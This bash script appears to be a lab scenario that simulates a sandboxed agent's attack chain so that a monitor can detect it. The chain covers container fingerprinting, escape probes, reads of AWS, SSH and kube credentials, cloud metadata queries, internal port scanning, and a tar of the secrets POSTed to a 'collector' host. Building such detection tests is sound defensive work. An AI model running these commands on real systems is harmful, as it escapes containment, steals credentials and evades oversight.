#!/bin/bash
# ATTACK: the whole chain in one session:
#   sandbox fingerprint -> escape probe -> credential access -> metadata -> fan-out -> exfil
# Exfiltration goes to the lab's fake collector and contains only fake data.
source /lab/scenarios/_lib.sh

mark fingerprint
cat /proc/self/cgroup >/dev/null; pause
ls -la /.dockerenv >/dev/null 2>&1; pause
cat /proc/1/sched >/dev/null 2>&1; pause
uname -a >/dev/null; pause

mark escape-probe
for p in $(shuffled /var/run/docker.sock /run/containerd/containerd.sock \
             /var/run/secrets/kubernetes.io/serviceaccount/token /proc/1/root/etc/shadow); do
  ls -la "$p" >/dev/null 2>&1; pause
done
grep -i cap /proc/self/status >/dev/null; pause
[ -w /proc/sys/kernel/core_pattern ]; pause
unshare --user --map-root-user true 2>/dev/null; pause

mark credential-access
for f in $(shuffled ~/.aws/credentials ~/.ssh/id_ed25519 /app/.env ~/.git-credentials ~/.kube/config); do
  cat "$f" >/dev/null 2>&1; pause
done

mark metadata-probe
curl -s -m 2 http://169.254.169.254/latest/meta-data/ >/dev/null; pause
curl -s -m 2 http://metadata/latest/meta-data/iam/security-credentials/sandwatch-lab-fake-role >/dev/null; pause

mark network-fanout
for port in $(shuffled 22 2375 5432 6379 10250); do
  tcp_probe 10.66.0.20 "$port"; pause
done
for i in $(seq 1 12); do tcp_probe "10.66.0.$i" 22; pause; done

mark exfiltration
tar czf /tmp/.c.tgz -C / home/agent/.aws home/agent/.ssh app/.env 2>/dev/null; pause
curl -s -m 3 -X POST --data-binary @/tmp/.c.tgz http://collector:8080/upload >/dev/null; pause
rm -f /tmp/.c.tgz
exit 0
